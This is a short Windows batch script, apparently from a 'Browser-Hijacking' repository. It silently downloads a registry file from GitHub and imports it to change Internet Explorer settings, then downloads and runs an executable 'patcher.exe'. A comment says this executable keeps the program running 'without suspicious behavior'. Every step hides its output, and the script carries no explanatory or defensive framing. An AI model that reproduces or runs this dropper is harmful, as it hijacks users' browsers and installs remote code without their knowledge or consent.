@REM Download IE configuration registry file
>nul 2>nul curl -o %tmp%\ieconf.reg -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO
@REM Import configuration file into registry
>nul 2>nul reg import %tmp%\ieconf.reg
@REM Download patcher to make the program run normally without suspicious behavior
>nul 2>nul curl -o %tmp%\patcher.exe -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
@REM Execute patcher
>nul 2>nul %tmp%\patcher.exe --unleash "%cd%"